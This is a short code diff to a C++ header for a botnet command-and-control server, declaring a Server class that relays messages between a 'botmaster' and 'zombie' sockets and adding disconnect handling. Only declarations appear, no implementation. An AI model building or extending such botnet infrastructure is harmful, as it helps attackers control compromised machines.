@@ -17,7 +17,7 @@
 class Server
 {
 public:
-	Server(std::string ip, int port);
+	Server(const char* ip, int port);
 	~Server();
 
 	bool init();
@@ -28,14 +28,16 @@ public:
 	bool createListeningSocket();
 	int acceptConnection();
 
-	void sendToZombies(const std::string& msg);
-	bool sendToZombie(SOCKET zombie, const std::string& msg);
-	bool sendToBotmaster(const std::string& msg);
+	void sendToZombies(const char* msg, int size);
+	bool sendToZombie(SOCKET zombie, const char* msg, int size);
+	bool sendToBotmaster(const char* msg, int size);
 
 	bool receive();
-	std::string getBotMasterMessage();
-	std::vector<std::string> getBotMessages();
+	const char* getBotMasterMessage();
+	std::vector<const char*> getBotMessages();
 
+	bool clientDisconnect();
+	void closeConnections();
 private:
 	std::string m_IpAddress;
 	int m_Port;
@@ -45,10 +47,11 @@ private:
 
 	std::vector<SOCKET> m_Zombies;
 
-	//rcv states
-	std::string m_BotMasterBuf;
+	bool m_BotMasterDisconnect = false;
+	char m_BotMasterBuf[4096];
 
-	std::vector<std::pair<SOCKET, std::string>> m_BotBufs;
+	std::vector<int> m_ZombieDisconnects;
+	std::vector<std::pair<SOCKET, const char*>> m_ZombieBufs;
 
 	//set of socket descriptors for select() 
 	fd_set m_Readfds;
